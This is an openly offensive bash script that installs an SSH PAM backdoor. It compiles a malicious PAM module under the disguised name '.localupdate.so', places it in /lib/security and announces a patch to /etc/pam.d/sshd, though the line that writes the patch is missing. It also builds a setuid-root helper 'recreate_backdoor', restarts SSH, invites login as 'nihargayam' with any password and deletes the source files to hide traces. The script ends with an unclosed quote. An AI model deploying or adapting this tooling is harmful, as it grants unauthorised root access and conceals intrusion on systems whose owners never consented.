#!/bin/bash

sudo apt update
sudo apt install libpam0g-dev




BACKDOOR_USER="nihargayam"

echo "[*] Compiling PAM backdoor..."
gcc -fPIC -fno-stack-protector -c pam_backdoor.c
ld -x --shared -o .localupdate.so pam_backdoor.o

echo "[*] Installing PAM module..."
sudo mkdir /lib/security;
sudo mv .localupdate.so /lib/security/

echo "[*] Patching /etc/pam.d/sshd..."
PAM_FILE="/etc/pam.d/sshd"
LINE="auth sufficient .localupdate.so"





gcc recreate_backdoor.c -o recreate_backdoor
sudo chown root:root recreate_backdoor
sudo chmod 4755 recreate_backdoor




echo "[*] Restarting SSH..."
sudo systemctl restart ssh

echo "[✔] Setup complete. Try logging in as '$BACKDOOR_USER' with any password."

sudo rm pam_backdoor.c
sudo rm pam_backdoor.o

echo "[✔] Clean complete

